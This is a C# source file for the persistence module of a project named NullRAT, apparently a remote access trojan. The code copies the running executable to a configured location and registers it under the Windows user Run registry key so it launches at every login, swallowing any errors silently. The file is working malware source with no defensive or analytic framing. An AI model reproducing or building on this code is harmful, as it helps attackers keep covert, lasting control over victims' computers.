using Microsoft.Win32;
using System;
using System.IO;
using NullRAT.Config;

namespace NullRAT.Core
{
    public static class Persistence
    {
        public static void Install()
        {
            if (!Config.EnablePersistence) return;

            try
            {
                string currentExe = System.Reflection.Assembly.GetExecutingAssembly().Location;
                if (currentExe != Config.InstallPath)
                {
                    Directory.CreateDirectory(Path.GetDirectoryName(Config.InstallPath));
                    File.Copy(currentExe, Config.InstallPath, true);
                }

                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue(Config.StartupName, Config.InstallPath);
            }
            catch { }
        }
    }
}